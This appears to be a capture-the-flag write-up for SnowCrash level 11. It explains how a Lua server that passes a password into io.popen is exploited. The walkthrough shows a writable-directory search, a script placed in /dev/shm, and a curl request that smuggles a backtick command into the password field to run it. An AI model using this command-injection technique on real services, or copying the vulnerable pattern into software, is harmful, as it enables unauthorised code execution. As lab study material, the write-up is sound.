#SnowCrash Level11

Let's go ahead and cat that level11.lua :
```
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

At first I satrted thinking of a way to decrypt that hash in order to give it as a Password.
But even if I did give it nothing would eventually happen.
Still I followed this idea. And then I realized it was a rabbit hole.
After that, I started executing the code online line by line.
I found out that whatever I pass in the password is gonna be used in the following line :
```
prog = io.popen("echo "...pass..." | sha1sum", "r")
```

It's like an RCE(remote code execution).
/tmp doesn't have the right permissions.
let's look arround for a bit to find a folder that has the write permissions for public.
Using this command :
```
level11@SnowCrash:~$ find / -writable 2>/dev/null | grep -v proc
/dev/vboxuser
/dev/log
/dev/shm
/dev/char/10:56
/dev/char/5:0
/dev/char/5:2
/dev/char/10:200
/dev/char/10:229
/dev/char/1:5
/dev/char/1:9
/dev/char/1:8
/dev/char/1:3
/dev/char/1:7
/dev/stderr
/dev/stdout
/dev/stdin
/dev/fd
/dev/pts/0
/dev/net/tun
/dev/ptmx
/dev/fuse
/dev/tty
/dev/urandom
/dev/random
/dev/full
/dev/zero
/dev/null
/run/acpid.socket
/run/dbus/system_bus_socket
/run/shm
/run/lock
/tmp
/var/crash
/var/lib/php5
/var/lock
/var/tmp
/rofs/dev/urandom
/rofs/var/lock
```

Can't use the first 2 so I used the 3rd one.
```
level11@SnowCrash:~$ cat /dev/shm/EXPLOIT
#!/bin/sh

getflag > /tmp/flaghh
```

Then :
```
level11@SnowCrash:~$ curl 'localhost:5151/?Password=`/*/*/EXPLOIT`'
Password: Erf nope..
level11@SnowCrash:~$ cat /tmp/flaghh
Check flag.Here is your token : 
```